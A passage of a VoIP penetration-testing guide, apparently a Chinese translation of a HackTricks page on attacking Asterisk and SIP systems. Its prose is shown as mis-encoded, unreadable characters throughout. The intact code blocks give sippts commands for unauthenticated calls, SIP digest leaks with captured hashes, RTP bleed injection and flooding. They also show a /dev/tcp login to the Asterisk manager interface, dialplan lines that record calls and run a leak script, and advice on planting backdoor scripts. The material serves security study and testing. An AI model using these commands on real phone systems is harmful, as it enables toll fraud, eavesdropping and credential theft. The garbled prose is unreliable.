*   **`SIPPTS invite`** æ¥è‡ª[sippts](https://github.com/Pepelux/sippts)**ï¼š** SIPPTS inviteæ£€æŸ¥**PBXæœåŠ¡å™¨æ˜¯å¦å…è®¸æˆ‘ä»¬åœ¨æ²¡æœ‰èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æ‹¨æ‰“ç”µè¯**ã€‚å¦‚æœSIPæœåŠ¡å™¨é…ç½®ä¸æ­£ç¡®ï¼Œå®ƒå°†å…è®¸æˆ‘ä»¬æ‹¨æ‰“å¤–éƒ¨å·ç ã€‚å®ƒè¿˜å¯ä»¥å…è®¸æˆ‘ä»¬å°†é€šè¯è½¬æ¥åˆ°ç¬¬äºŒä¸ªå¤–éƒ¨å·ç ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨çš„AsteriskæœåŠ¡å™¨å…·æœ‰é”™è¯¯çš„ä¸Šä¸‹æ–‡é…ç½®ï¼Œæ‚¨å¯ä»¥æ¥å—æœªç»æˆæƒçš„INVITEè¯·æ±‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸çŸ¥é“ä»»ä½•ç”¨æˆ·/å¯†ç çš„æƒ…å†µä¸‹æ‹¨æ‰“ç”µè¯ã€‚
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### å…è´¹é€šè¯ / é…ç½®é”™è¯¯çš„ IVRS

IVRS ä»£è¡¨**äº¤äº’å¼è¯­éŸ³åº”ç­”ç³»ç»Ÿ**ï¼Œæ˜¯ä¸€ç§ç”µè¯æŠ€æœ¯ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡è¯­éŸ³æˆ–æŒ‰é”®è¾“å…¥ä¸è®¡ç®—æœºåŒ–ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚IVRS ç”¨äºæ„å»º**è‡ªåŠ¨å‘¼å«å¤„ç†**ç³»ç»Ÿï¼Œæä¾›ä¸€ç³»åˆ—åŠŸèƒ½ï¼Œå¦‚æä¾›ä¿¡æ¯ã€è·¯ç”±å‘¼å«å’Œæ•è·ç”¨æˆ·è¾“å…¥ã€‚

VoIP ç³»ç»Ÿä¸­çš„ IVRS é€šå¸¸åŒ…æ‹¬ï¼š

1. **è¯­éŸ³æç¤º**ï¼šé¢„å…ˆå½•åˆ¶çš„éŸ³é¢‘æ¶ˆæ¯ï¼ŒæŒ‡å¯¼ç”¨æˆ·æµè§ˆ IVR èœå•é€‰é¡¹å’Œè¯´æ˜ã€‚
2. **DTMF**ï¼ˆåŒéŸ³å¤šé¢‘ï¼‰ä¿¡å·ï¼šé€šè¿‡åœ¨ç”µè¯ä¸ŠæŒ‰é”®ç”Ÿæˆçš„æŒ‰é”®è¾“å…¥ï¼Œç”¨äºæµè§ˆ IVR èœå•å¹¶æä¾›è¾“å…¥ã€‚
3. **å‘¼å«è·¯ç”±**ï¼šæ ¹æ®ç”¨æˆ·è¾“å…¥å°†å‘¼å«å®šå‘åˆ°é€‚å½“çš„ç›®çš„åœ°ï¼Œå¦‚ç‰¹å®šéƒ¨é—¨ã€ä»£ç†æˆ–åˆ†æœºã€‚
4. **ç”¨æˆ·è¾“å…¥æ•è·**ï¼šä»å‘¼å«è€…æ”¶é›†ä¿¡æ¯ï¼Œå¦‚å¸å·å·ç ã€æ¡ˆä¾‹ ID æˆ–ä»»ä½•å…¶ä»–ç›¸å…³æ•°æ®ã€‚
5. **ä¸å¤–éƒ¨ç³»ç»Ÿé›†æˆ**ï¼šå°† IVR ç³»ç»Ÿè¿æ¥åˆ°æ•°æ®åº“æˆ–å…¶ä»–è½¯ä»¶ç³»ç»Ÿï¼Œä»¥è®¿é—®æˆ–æ›´æ–°ä¿¡æ¯ï¼Œæ‰§è¡Œæ“ä½œæˆ–è§¦å‘äº‹ä»¶ã€‚

åœ¨ Asterisk VoIP ç³»ç»Ÿä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ‹¨å·è®¡åˆ’ï¼ˆ**`extensions.conf`** æ–‡ä»¶ï¼‰å’Œå„ç§åº”ç”¨ç¨‹åºï¼ˆå¦‚ `Background()`ã€`Playback()`ã€`Read()` ç­‰ï¼‰åˆ›å»º IVRã€‚è¿™äº›åº”ç”¨ç¨‹åºå¸®åŠ©æ‚¨æ’­æ”¾è¯­éŸ³æç¤ºï¼Œæ•è·ç”¨æˆ·è¾“å…¥å¹¶æ§åˆ¶å‘¼å«æµç¨‹ã€‚

#### æ˜“å—æ”»å‡»é…ç½®ç¤ºä¾‹
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
å‰é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œç”¨æˆ·è¢«è¦æ±‚**æŒ‰1æ‹¨æ‰“**ä¸€ä¸ªéƒ¨é—¨ï¼Œ**æŒ‰2æ‹¨æ‰“**å¦ä¸€ä¸ªéƒ¨é—¨ï¼Œæˆ–è€…**è¾“å…¥å®Œæ•´åˆ†æœºå·ç **ï¼ˆå¦‚æœçŸ¥é“çš„è¯ï¼‰ã€‚
æ¼æ´åœ¨äºæŒ‡å®šçš„**åˆ†æœºå·é•¿åº¦æ²¡æœ‰ç»è¿‡æ£€æŸ¥ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥è¾“å…¥å®Œæ•´å·ç å¹¶æ‹¨æ‰“ã€‚**

### åˆ†æœºæ³¨å…¥

ä½¿ç”¨åˆ†æœºå·ç ï¼Œä¾‹å¦‚ï¼š
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
åœ¨**`${EXTEN}`**æ˜¯å°†è¦è¢«å‘¼å«çš„**åˆ†æœºå·**æ—¶ï¼Œå½“è¾“å…¥**ext 101**æ—¶ä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š
```scss
exten => 101,1,Dial(SIP/101)
```
ç„¶è€Œï¼Œå¦‚æœ **`${EXTEN}`** å…è®¸è¾“å…¥**ä¸ä»…é™äºæ•°å­—**ï¼ˆå°±åƒåœ¨æ—§ç‰ˆçš„Asteriskä¸­ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥è¾“å…¥ **`101&SIP123123123`** æ¥æ‹¨æ‰“ç”µè¯å·ç 123123123ã€‚è¿™å°†å¯¼è‡´ä»¥ä¸‹ç»“æœï¼š
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
å› æ­¤ï¼Œå¯¹åˆ†æœº**`101`**å’Œ**`123123123`**çš„å‘¼å«å°†è¢«å‘é€ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ¥å¬å‘¼å«çš„åˆ†æœºä¼šå»ºç«‹è¿æ¥...ä½†å¦‚æœæ”»å‡»è€…ä½¿ç”¨ä¸€ä¸ª**ç»•è¿‡ä»»ä½•åŒ¹é…**çš„åˆ†æœºï¼Œè¯¥åˆ†æœºæ­£åœ¨æ‰§è¡ŒåŒ¹é…ä½†ä¸å­˜åœ¨ï¼Œä»–å¯ä»¥**æ³¨å…¥å‘¼å«åªåˆ°æœŸæœ›çš„å·ç **ã€‚

## SIPDigestLeakæ¼æ´

SIP Digest Leakæ˜¯ä¸€ç§å½±å“å¤§é‡SIPç”µè¯çš„æ¼æ´ï¼ŒåŒ…æ‹¬ç¡¬ä»¶å’Œè½¯ä»¶IPç”µè¯ä»¥åŠç”µè¯é€‚é…å™¨ï¼ˆVoIPåˆ°æ¨¡æ‹Ÿç”µè¯ï¼‰ã€‚è¯¥æ¼æ´å…è®¸**æ³„éœ²Digestè®¤è¯å“åº”**ï¼Œè¯¥å“åº”æ˜¯æ ¹æ®å¯†ç è®¡ç®—çš„ã€‚ç„¶åå¯ä»¥è¿›è¡Œ**ç¦»çº¿å¯†ç æ”»å‡»**ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®æŒ‘æˆ˜å“åº”æ¢å¤å¤§å¤šæ•°å¯†ç ã€‚

**[ä»è¿™é‡Œå¼€å§‹çš„æ¼æ´åœºæ™¯**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. ä¸€ä¸ªIPç”µè¯ï¼ˆå—å®³è€…ï¼‰æ­£åœ¨ä¾¦å¬ä»»ä½•ç«¯å£ï¼ˆä¾‹å¦‚ï¼š5060ï¼‰ï¼Œæ¥å—ç”µè¯
2. æ”»å‡»è€…å‘IPç”µè¯å‘é€INVITE
3. å—å®³è€…ç”µè¯å¼€å§‹å“é“ƒï¼Œæœ‰äººæ¥å¬å¹¶æŒ‚æ–­ï¼ˆå› ä¸ºåœ¨å¦ä¸€ç«¯æ²¡æœ‰äººæ¥å¬ç”µè¯ï¼‰
4. å½“ç”µè¯æŒ‚æ–­æ—¶ï¼Œ**å—å®³è€…ç”µè¯å‘æ”»å‡»è€…å‘é€ä¸€ä¸ªBYE**
5. **æ”»å‡»è€…å‘å‡ºä¸€ä¸ª407å“åº”**ï¼Œ**è¦æ±‚è¿›è¡Œèº«ä»½éªŒè¯**å¹¶å‘å‡ºä¸€ä¸ªèº«ä»½éªŒè¯æŒ‘æˆ˜
6. **å—å®³è€…ç”µè¯åœ¨ç¬¬äºŒä¸ªBYEä¸­å¯¹èº«ä»½éªŒè¯æŒ‘æˆ˜æä¾›å“åº”**
7. **æ”»å‡»è€…ç„¶åå¯ä»¥åœ¨æœ¬åœ°æœºå™¨ä¸Šï¼ˆæˆ–åˆ†å¸ƒå¼ç½‘ç»œç­‰ï¼‰å¯¹æŒ‘æˆ˜å“åº”è¿›è¡Œæš´åŠ›ç ´è§£æ”»å‡»**ï¼ŒçŒœæµ‹å¯†ç 

* **SIPPTSæ³„æ¼**æ¥è‡ª[**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTSæ³„æ¼åˆ©ç”¨äº†å½±å“å¤§é‡SIPç”µè¯çš„SIP Digest Leakæ¼æ´ã€‚è¾“å‡ºå¯ä»¥ä¿å­˜ä¸ºSipCrackæ ¼å¼ï¼Œä»¥ä¾¿ä½¿ç”¨SIPPTS dcrackæˆ–SipCrackå·¥å…·è¿›è¡Œæš´åŠ›ç ´è§£ã€‚
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### ç‚¹å‡»é€šè¯

Click2Callå…è®¸ä¸€ä¸ª**ç½‘é¡µç”¨æˆ·**ï¼ˆä¾‹å¦‚å¯èƒ½å¯¹æŸä¸ªäº§å“æ„Ÿå…´è¶£ï¼‰**è¾“å…¥**ä»–çš„**ç”µè¯å·ç **ä»¥ä¾¿æ¥åˆ°ç”µè¯ã€‚ç„¶åä¼šæ‹¨æ‰“ä¸€ä¸ªå•†ä¸šç”µè¯ï¼Œå½“ä»–**æ¥å¬ç”µè¯**æ—¶ï¼Œç”¨æˆ·å°†è¢«**å‘¼å«å¹¶ä¸ä»£ç†äººè¿æ¥**ã€‚

ä¸€ä¸ªå¸¸è§çš„Asteriské…ç½®æ–‡ä»¶æ˜¯ï¼š
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* å…ˆå‰çš„é…ç½®å…è®¸**ä»»ä½•IPåœ°å€è¿æ¥**ï¼ˆå¦‚æœçŸ¥é“å¯†ç ï¼‰ã€‚
* è¦åƒä¹‹å‰æŒ‡å®šçš„é‚£æ ·**å‘èµ·å‘¼å«**ï¼Œ**ä¸éœ€è¦è¯»å–æƒé™**ï¼Œåªéœ€è¦**å†™å…¥**ä¸­çš„**å‘èµ·**æƒé™ã€‚

æœ‰äº†è¿™äº›æƒé™ï¼Œä»»ä½•çŸ¥é“å¯†ç çš„IPéƒ½å¯ä»¥è¿æ¥å¹¶æå–è¿‡å¤šä¿¡æ¯ï¼Œæ¯”å¦‚ï¼š
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**æ›´å¤šä¿¡æ¯æˆ–æ“ä½œå¯èƒ½ä¼šè¢«è¯·æ±‚ã€‚**

### **çªƒå¬**

åœ¨Asteriskä¸­ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤**`ChanSpy`**æŒ‡å®šè¦ç›‘å¬çš„**åˆ†æœºå·ç **ï¼ˆæˆ–å…¨éƒ¨åˆ†æœºå·ç ï¼‰æ¥çªƒå¬æ­£åœ¨è¿›è¡Œçš„å¯¹è¯ã€‚è¿™ä¸ªå‘½ä»¤éœ€è¦åˆ†é…ç»™ä¸€ä¸ªåˆ†æœºå·ç ã€‚

ä¾‹å¦‚ï¼Œ**`exten => 333,1,ChanSpy('all',qb)`** è¡¨ç¤ºå¦‚æœæ‚¨**æ‹¨æ‰“**åˆ†æœºå·ç **333**ï¼Œå®ƒå°†**ç›‘å¬**æ‰€æœ‰åˆ†æœºå·ç ï¼Œ**åœ¨æ–°å¯¹è¯å¼€å§‹æ—¶**ï¼ˆ**`b`**ï¼‰ä»¥å®‰é™æ¨¡å¼ï¼ˆ**`q`**ï¼‰å¼€å§‹æ”¶å¬ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å¸Œæœ›å¹²æ‰°ã€‚æ‚¨å¯ä»¥é€šè¿‡æŒ‰ä¸‹**`*`**é”®æˆ–æ ‡è®°åˆ†æœºå·ç æ¥ä»ä¸€æ¬¡å¯¹è¯åˆ‡æ¢åˆ°å¦ä¸€æ¬¡å¯¹è¯ã€‚

è¿˜å¯ä»¥ä½¿ç”¨**`ExtenSpy`**æ¥ä»…ç›‘è§†ä¸€ä¸ªåˆ†æœºå·ç ã€‚

é™¤äº†æ”¶å¬å¯¹è¯ï¼Œè¿˜å¯ä»¥ä½¿ç”¨è¯¸å¦‚ä»¥ä¸‹åˆ†æœºå·ç ä¹‹ç±»çš„åˆ†æœºå·ç **å°†å®ƒä»¬è®°å½•åœ¨æ–‡ä»¶ä¸­**ï¼š

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

é€šè¯å°†è¢«ä¿å­˜åœ¨ **`/tmp`** ä¸­ã€‚

æ‚¨ç”šè‡³å¯ä»¥è®©Asteriskæ‰§è¡Œä¸€ä¸ªè„šæœ¬ï¼Œåœ¨é€šè¯å…³é—­æ—¶æ³„æ¼é€šè¯å†…å®¹ã€‚
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleedæ¼æ´

**RTCPBleed**æ˜¯ä¸€ä¸ªå½±å“åŸºäºAsteriskçš„VoIPæœåŠ¡å™¨çš„é‡å¤§å®‰å…¨é—®é¢˜ï¼ˆäº2017å¹´å‘å¸ƒï¼‰ã€‚è¯¥æ¼æ´å…è®¸**RTPï¼ˆå®æ—¶ä¼ è¾“åè®®ï¼‰æµé‡**ï¼Œå³VoIPé€šè¯ï¼Œè¢«ä»»ä½•äº’è”ç½‘ä¸Šçš„äºº**æ‹¦æˆªå’Œé‡å®šå‘**ã€‚è¿™æ˜¯å› ä¸ºå½“RTPæµé‡é€šè¿‡NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰é˜²ç«å¢™æ—¶ï¼Œä¼šç»•è¿‡èº«ä»½éªŒè¯ã€‚

RTPä»£ç†è¯•å›¾è§£å†³å½±å“RTCç³»ç»Ÿçš„**NATé™åˆ¶**ï¼Œé€šè¿‡åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªæ–¹ä¹‹é—´ä»£ç†RTPæµã€‚å½“å­˜åœ¨NATæ—¶ï¼ŒRTPä»£ç†è½¯ä»¶é€šå¸¸æ— æ³•ä¾èµ–é€šè¿‡ä¿¡ä»¤ï¼ˆä¾‹å¦‚SIPï¼‰æ£€ç´¢çš„RTP IPå’Œç«¯å£ä¿¡æ¯ã€‚å› æ­¤ï¼Œè®¸å¤šRTPä»£ç†å·²ç»å®ç°äº†ä¸€ç§æœºåˆ¶ï¼Œå…¶ä¸­è¿™æ ·çš„**IPå’Œç«¯å£å…ƒç»„ä¼šè¢«è‡ªåŠ¨å­¦ä¹ **ã€‚é€šå¸¸é€šè¿‡æ£€æŸ¥ä¼ å…¥çš„RTPæµé‡å¹¶å°†ä»»ä½•ä¼ å…¥RTPæµé‡çš„æºIPå’Œç«¯å£æ ‡è®°ä¸ºåº”è¯¥å“åº”çš„IPå’Œç«¯å£æ¥å®Œæˆã€‚è¿™ç§æœºåˆ¶ï¼Œå¯èƒ½è¢«ç§°ä¸ºâ€œå­¦ä¹ æ¨¡å¼â€ï¼Œ**ä¸ä½¿ç”¨ä»»ä½•å½¢å¼çš„èº«ä»½éªŒè¯**ã€‚å› æ­¤ï¼Œ**æ”»å‡»è€…**å¯ä»¥**å‘RTPä»£ç†å‘é€RTPæµé‡**ï¼Œå¹¶æ¥æ”¶åˆ°æœ¬åº”å‘é€ç»™æ­£åœ¨è¿›è¡Œçš„RTPæµçš„å‘¼å«æ–¹æˆ–è¢«å«æ–¹çš„ä»£ç†RTPæµé‡ã€‚æˆ‘ä»¬å°†è¿™ç§æ¼æ´ç§°ä¸ºRTP Bleedï¼Œå› ä¸ºå®ƒå…è®¸æ”»å‡»è€…æ¥æ”¶æœ¬åº”å‘é€ç»™åˆæ³•ç”¨æˆ·çš„RTPåª’ä½“æµã€‚

RTPä»£ç†å’ŒRTPå †æ ˆçš„å¦ä¸€ä¸ªæœ‰è¶£è¡Œä¸ºæ˜¯ï¼Œæœ‰æ—¶ï¼Œ**å³ä½¿ä¸å®¹æ˜“å—åˆ°RTP Bleedçš„å½±å“**ï¼Œå®ƒä»¬ä¹Ÿä¼š**æ¥å—ã€è½¬å‘å’Œ/æˆ–å¤„ç†æ¥è‡ªä»»ä½•æºçš„RTPæ•°æ®åŒ…**ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å‘é€RTPæ•°æ®åŒ…ï¼Œè¿™å¯èƒ½å…è®¸ä»–ä»¬å°†è‡ªå·±çš„åª’ä½“æ³¨å…¥åˆ°åˆæ³•åª’ä½“ä¸­ã€‚æˆ‘ä»¬å°†è¿™ç§æ”»å‡»ç§°ä¸ºRTPæ³¨å…¥ï¼Œå› ä¸ºå®ƒå…è®¸å°†éæ³•çš„RTPæ•°æ®åŒ…æ³¨å…¥åˆ°ç°æœ‰çš„RTPæµä¸­ã€‚è¿™ç§æ¼æ´å¯èƒ½å­˜åœ¨äºRTPä»£ç†å’Œç«¯ç‚¹ä¸­ã€‚

Asteriskå’ŒFreePBXä¼ ç»Ÿä¸Šä½¿ç”¨**`NAT=yes`è®¾ç½®**ï¼Œè¿™ä½¿å¾—RTPæµé‡å¯ä»¥ç»•è¿‡èº«ä»½éªŒè¯ï¼Œå¯èƒ½å¯¼è‡´é€šè¯ä¸­æ²¡æœ‰éŸ³é¢‘æˆ–å•å‘éŸ³é¢‘ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** æ¥è‡ª[**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SIPPTS rtpbleedæ£€æµ‹RTP Bleedæ¼æ´å‘é€RTPæµã€‚
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SIPPTS rtcpbleed é€šè¿‡å‘é€ RTCP æµæ¥æ£€æµ‹ RTP Bleed æ¼æ´ã€‚
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SIPPTS rtpbleedflood åˆ©ç”¨ RTP Bleed æ¼æ´å‘é€ RTP æµã€‚
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**ï¼š** SIPPTS rtpbleedinject åˆ©ç”¨ RTP Bleed æ¼æ´æ³¨å…¥éŸ³é¢‘æ–‡ä»¶ï¼ˆWAV æ ¼å¼ï¼‰ã€‚
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

åœ¨Asteriskä¸­ï¼Œå¦‚æœä½ è®¾æ³•èƒ½å¤Ÿ**æ·»åŠ åˆ†æœºè§„åˆ™å¹¶é‡æ–°åŠ è½½å®ƒä»¬**ï¼ˆä¾‹å¦‚é€šè¿‡å…¥ä¾µä¸€ä¸ªå­˜åœ¨æ¼æ´çš„Webç®¡ç†æœåŠ¡å™¨ï¼‰ï¼Œå°±æœ‰å¯èƒ½ä½¿ç”¨**`System`**å‘½ä»¤å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
æœ‰ä¸€ä¸ªåä¸º**`Shell`**çš„å‘½ä»¤ï¼Œå¯ä»¥åœ¨å¿…è¦æ—¶ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œ**è€Œä¸æ˜¯ä½¿ç”¨`System`**ã€‚

{% hint style="warning" %}
å¦‚æœæœåŠ¡å™¨åœ¨**`System`**å‘½ä»¤ä¸­ï¼ˆå¦‚åœ¨Elastixä¸­ï¼‰**ç¦æ­¢ä½¿ç”¨æŸäº›å­—ç¬¦**ï¼Œè¯·æ£€æŸ¥ Web æœåŠ¡å™¨æ˜¯å¦å…è®¸ä»¥æŸç§æ–¹å¼åœ¨ç³»ç»Ÿå†…**åˆ›å»ºæ–‡ä»¶**ï¼ˆå¦‚åœ¨Elastixæˆ– trixbox ä¸­ï¼‰ï¼Œç„¶åä½¿ç”¨å®ƒæ¥**åˆ›å»ºä¸€ä¸ªåé—¨è„šæœ¬**ï¼Œç„¶åä½¿ç”¨**`System`**æ¥**æ‰§è¡Œ**è¯¥**è„šæœ¬**ã€‚
{% endhint %}

#### æœ‰è¶£çš„æœ¬åœ°æ–‡ä»¶å’Œæƒé™

* **`sip.conf`** -> åŒ…å« SIP ç”¨æˆ·çš„å¯†ç ã€‚
* å¦‚æœ**Asterisk æœåŠ¡å™¨ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œ**ï¼Œåˆ™å¯ä»¥å¦¥å root ç”¨æˆ·
* **mysql root ç”¨æˆ·**å¯èƒ½**æ²¡æœ‰å¯†ç **ã€‚
* è¿™å¯ä»¥ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ mysql ç”¨æˆ·ä½œä¸ºåé—¨
* **`FreePBX`**
* **`amportal.conf`** -> åŒ…å« Web é¢æ¿ç®¡ç†å‘˜ï¼ˆFreePBXï¼‰çš„å¯†ç 
* **`FreePBX.conf`** -> åŒ…å«ç”¨äºè®¿é—®æ•°æ®åº“çš„ç”¨æˆ· FreePBXuser çš„å¯†ç 
* è¿™å¯ä»¥ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ mysql ç”¨æˆ·ä½œä¸ºåé—¨
* **`Elastix`**
* **`Elastix.conf`** -> åŒ…å«æ˜æ–‡å¯†ç ï¼Œå¦‚ mysql root å¯†ç ã€IMAPd å¯†ç ã€web ç®¡ç†å‘˜å¯†ç 
* **å¤šä¸ªæ–‡ä»¶å¤¹**å°†å±äºå—æŸçš„ asterisk ç”¨æˆ·ï¼ˆå¦‚æœä¸æ˜¯ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œï¼‰ã€‚è¯¥ç”¨æˆ·å¯ä»¥è¯»å–å…ˆå‰çš„æ–‡ä»¶å¹¶æ§åˆ¶é…ç½®ï¼Œå› æ­¤ä»–å¯ä»¥ä½¿ Asterisk åœ¨æ‰§è¡Œæ—¶åŠ è½½å…¶ä»–å¸¦æœ‰åé—¨çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚

### RTP æ³¨å…¥

å¯ä»¥ä½¿ç”¨å·¥å…·å¦‚**`rtpinsertsound`**ï¼ˆ`sudo apt install rtpinsertsound`ï¼‰å’Œ**`rtpmixsound`**ï¼ˆ`sudo apt install rtpmixsound`ï¼‰åœ¨å¯¹è¯ä¸­æ’å…¥**`.wav`**ã€‚

æˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨æ¥è‡ª [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) çš„è„šæœ¬æ¥**æ‰«æå¯¹è¯**ï¼ˆ**`rtpscan.pl`**ï¼‰ã€å‘å¯¹è¯å‘é€ `.wav`ï¼ˆ**`rtpsend.pl`**ï¼‰å’Œåœ¨å¯¹è¯ä¸­**æ’å…¥å™ªéŸ³**ï¼ˆ**`rtpflood.pl`**ï¼‰ã€‚

### DoS

æœ‰å‡ ç§æ–¹æ³•å¯ä»¥å°è¯•åœ¨ VoIP æœåŠ¡å™¨ä¸Šå®ç° DoSã€‚

* **`SIPPTS flood`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood å‘ç›®æ ‡å‘é€æ— é™æ¶ˆæ¯ã€‚
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping å‘é€ SIP ping ä»¥æŸ¥çœ‹æœåŠ¡å™¨å“åº”æ—¶é—´ã€‚
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS Asterisk ä½¿ç”¨çš„ IAX åè®®
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): ç”¨äºåœ¨ UDP/IP ä¸Šæ‰§è¡Œ SIP/SDP INVITE æ¶ˆæ¯æ´ªæ³›çš„å·¥å…·ã€‚
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): å‘é€å¤šä¸ªæ ¼å¼æ­£ç¡®çš„ RTP æ•°æ®åŒ…ã€‚éœ€è¦çŸ¥é“æ­£åœ¨ä½¿ç”¨çš„ RTP ç«¯å£ï¼ˆå…ˆè¿›è¡Œå—…æ¢ï¼‰ã€‚
* [**SIPp**](https://github.com/SIPp/sipp): å…è®¸åˆ†æå’Œç”Ÿæˆ SIP æµé‡ã€‚å› æ­¤ä¹Ÿå¯ä»¥ç”¨äº DoSã€‚
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP ç‘å£«å†›åˆ€ã€‚ä¹Ÿå¯ç”¨äºæ‰§è¡Œ SIP æ”»å‡»ã€‚
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### æ“ä½œç³»ç»Ÿæ¼æ´

å®‰è£… Asterisk ç­‰è½¯ä»¶çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä¸‹è½½å·²ç»å®‰è£…äº†å®ƒçš„**æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆ**ï¼Œä¾‹å¦‚ï¼š**FreePBXã€Elastixã€Trixbox**... ä½†è¿™äº›çš„é—®é¢˜åœ¨äºä¸€æ—¦å®ƒå¼€å§‹è¿è¡Œï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯èƒ½**ä¸ä¼šå†æ›´æ–°å®ƒä»¬**ï¼Œå¹¶ä¸”**æ¼æ´**ä¼šéšç€æ—¶é—´è¢«å‘ç°ã€‚

## å‚è€ƒèµ„æ–™

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œä½¿ç”¨</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

